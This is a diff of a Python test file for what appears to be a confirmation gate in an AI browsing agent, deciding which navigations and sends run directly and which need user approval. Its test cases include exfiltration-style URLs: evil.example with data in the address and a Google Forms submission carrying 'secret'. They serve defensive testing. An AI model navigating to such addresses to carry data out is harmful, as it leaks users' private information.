@@ -76,31 +76,28 @@ SHOWN = {key("https://evil.example/?d=1")}
 TRUSTED = {"waitrose.com"}
 
 
-# SPEC §5.2: kind × trusted / private / shown / data in the address / allow_all_sites. One row per rule.
+# SPEC §5.2: kind × trusted / opened / shown / data in the address / allow_all_sites. One row per rule.
 @pytest.mark.parametrize(
     "call,facts,outcome",
     [
         # 3. a trusted destination runs, whatever else holds
         (("browser_type", {"text": "x"}), {"trusted": TRUSTED}, "run"),
-        (("browser_type", {"text": "x"}), {"trusted": TRUSTED, "private": True}, "run"),
         (nav("https://www.waitrose.com/search?q=fluid"), {"trusted": TRUSTED}, "run"),  # data in it: the bug
-        (nav("https://www.waitrose.com/search?q=fluid"), {"trusted": TRUSTED, "private": True}, "run"),
         (nav("https://www.waitrose.com/x"), {"trusted": TRUSTED, "allow_all_sites": False}, "run"),
         # 5. typing elsewhere is a card
         (("browser_type", {"text": "x"}), {"trusted": {"other.example"}}, "card"),
         # 7. open
-        (nav("https://thefork.co.uk/x"), {}, "run"),
+        (nav("https://thefork.co.uk/x"), {}, "card"),  # a site new to the task
+        (nav("https://thefork.co.uk/x"), {"opened": {"thefork.co.uk"}}, "run"),
         (nav("https://thefork.co.uk/x"), {"allow_all_sites": False}, "card"),
         (nav("https://thefork.co.uk/x"), {"allow_all_sites": False, "opened": {"thefork.co.uk"}}, "run"),
         (nav("https://evil.example/?d=1"), {}, "card"),  # the model wrote data into it
         (nav("https://evil.example/?d=1"), {"shown": SHOWN}, "run"),  # a link the page showed
         (nav("https://evil.example/?d=1"), {"opened": {"evil.example"}}, "card"),
-        (nav("https://evil.example/"), {"private": True}, "card"),  # after mail or a signed-in page
-        (nav("https://evil.example/"), {"private": True, "opened": {"evil.example"}}, "run"),
         (nav("https://evil.example/#a=b"), {}, "card"),
         # 6. search
-        (nav("https://www.google.com/search?q=lisbon"), {}, "run"),
-        (nav("https://www.google.com/search?q=lisbon"), {"private": True}, "card"),
+        (nav("https://www.google.com/search?q=lisbon"), {}, "card"),
+        (nav("https://www.google.com/search?q=lisbon"), {"trusted": {"google.com"}}, "card"),
         (nav("https://docs.google.com/forms/d/x/formResponse?entry.1=secret"), {}, "card"),  # not a search
         (("browser_tabs", {"action": "new", "url": "https://evil.example/?d=1"}), {}, "card"),
     ],
@@ -111,10 +108,8 @@ def test_the_gate(call, facts, outcome):
 
 def test_send_is_always_a_card():
     """SPEC §5.2 rule 2: email, memories, background tasks, MCP writes; trust doesn't apply."""
-    for facts in ({}, {"trusted": {"gmail.com", ""}}, {"private": True}):
+    for facts in ({}, {"trusted": {"gmail.com", ""}}):
         assert decide(Action("send"), Facts(**facts)).outcome == "card"
-    assert decide(Action("search"), Facts()).outcome == "run"
-    assert decide(Action("search"), Facts(private=True)).outcome == "card"
 
 
 def test_trusted_runs_are_marked_for_the_audit():
@@ -199,43 +194,6 @@ def test_the_model_never_hears_about_cards_or_trust():
         text = json.dumps(spec)
         assert not AUDIT_WORDS.search(text), spec["function"]["name"]
     assert not AUDIT_WORDS.search(guard.STOPPED)
-
-
-async def test_private_data_is_declared_on_the_tool_and_set_by_the_registry():
-    """SPEC §5.2: no tool sets it; a new one that reads private data only has to say so where it's registered."""
-    from types import SimpleNamespace
-
-    from aha_local.tools.registry import Registry, TaskState, Tool, ToolResult, params
-
-    async def ok(args, ctx):
-        return ToolResult("their data")
-
-    async def failed(args, ctx):
-        return ToolResult("not connected", error=True)
-
-    reg = Registry()
-    reg.add(Tool("reads_private", "", params(), ok, private=True))
-    reg.add(Tool("reads_private_but_fails", "", params(), failed, private=True))
-    reg.add(Tool("reads_public", "", params(), ok))
-    ctx = SimpleNamespace(task=TaskState())
-    await reg.call("reads_public", {}, ctx)
-    await reg.call("reads_private_but_fails", {}, ctx)
-    assert not ctx.task.private
-    await reg.call("reads_private", {}, ctx)
-    assert ctx.task.private
-    from aha_local.tools import calendar, mail
-
-    for module in (mail, calendar):
-        module.register(reg)
-    assert {t for t in reg.names() if reg._tools[t].private} == {
-        "email_search",
-        "email_read",
-        "calendar_list",
-        "calendar_update",
-        "calendar_delete",
-        "reads_private",
-        "reads_private_but_fails",
-    }
 
 
 def test_typing_into_a_message_box_is_a_send_on_any_site():
